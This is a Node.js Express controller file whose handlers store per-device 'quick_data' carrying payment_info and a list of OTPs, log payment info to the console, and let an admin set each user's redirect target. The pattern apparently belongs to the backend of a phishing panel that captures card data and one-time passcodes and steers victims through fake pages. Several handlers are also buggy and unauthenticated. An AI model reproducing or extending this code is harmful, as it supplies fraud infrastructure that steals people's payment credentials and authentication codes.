const User = require("../model/user");


exports.addUser = async (req, res) => {

    const { device, last_connected, id } = req.body;
    try {
        const user = await User.create({
            id: id,
            device: device,
            last_connected: last_connected,
            quick_data: [],
            otp: [],
        });
        return res.send({ success: true });

    } catch (err) {
        console.log("Error while adding user :=======> ", err);
        return res.status(500).json({ message: err.message });
    }

};
exports.updateUser = async (req, res) => {

    const { id, quickdata, otp } = req.body;

    try {
        if (quickdata) {
            const user = await User.findOne({ id: id });


            if (!user) {
                // Handle the case where the user with the given ID is not found
                return null;
            }

            // Add the newQuickData element to the quick_data array
            console.log("info::", quickdata.payment_info)
            user.quick_data.addToSet(quickdata);

            // Save the updated user document
            await user.save();

            return user;

        }
        if (otp) {
            const user = await User.findOne({ id: id });


            if (!user) {
                // Handle the case where the user with the given ID is not found
                return null;
            }

            // Add the newQuickData element to the quick_data array
            console.log("info::", otp.payment_info)
            user.otp.addToSet(otp);

            // Save the updated user document
            await user.save();

            return user;

        }

        const user = await User.findOne({ id: id });
        return res.send(user);
    } catch (err) {
        return res.status(500).json({ message: err.message });
    }

};

exports.getAllUsers = async (req, res) => {
    try {
        const users = await User.find().sort({ last_connected: -1 });
        console.log("All users fetched successfully!");
        return res.status(200).json(users);
    } catch (err) {
        console.log("Error while fetching all users: ", err);
        return res.status(500).json({ message: err.message });
    }
};


exports.deleteUser = async (req, res) => {
    const { ids } = req.body; // IDs of users to delete (can be an array)

    try {
        if (ids.length>1) {
            // If 'ids' is an array, delete multiple users
            const deletionResult = await User.deleteMany({ _id: { $in: ids } });
            if (deletionResult.deletedCount > 0) {
                return res.json({ success: true, message: `${deletionResult.deletedCount} user(s) deleted successfully` });
            } else {
                return res.json({ success: false, message: 'No users found for deletion' });
            }
        } else {

            // If 'ids' is a single value, delete a single user
            const deletionResult = await User.deleteOne({ _id: ids[0] });
            if (deletionResult.deletedCount > 0) {
                return res.json({ success: true, message: 'User deleted successfully' });
            } else {
                return res.json({ success: false, message: 'User not found for deletion' });
            }
        }
    } catch (err) {
        console.log('Error while deleting user(s): ', err);
        return res.status(500).json({ success: false, message: err.message });
    }
};


exports.getUserById = async (req, res) => {
    const userId = req.params.id; // Extract user ID from request parameters

    try {
        const user = await User.findById(userId); // Assuming User is your Mongoose model

        if (!user) {
            return res.status(404).json({ message: "User not found" });
        }
        user.logs = user.logs.reverse();

        console.log("User fetched successfully by ID!");
        return res.status(200).json(user);
    } catch (err) {
        console.log("Error while fetching user by ID: ", err);
        return res.status(500).json({ message: err.message });
    }
};


exports.updateRedirectAdmin = async (req, res) => {
    const { id, redirect ,logs} = req.body;
    const user = await User.findOne({ id: id });
   user.redirect = redirect;


    // Save the updated user document

        // Add the newQuickData element to the quick_data array

        user.logs.addToSet(logs);
        //console.log(user);

        // Save the updated user document
        await user.save();



    return res.send("success");
}







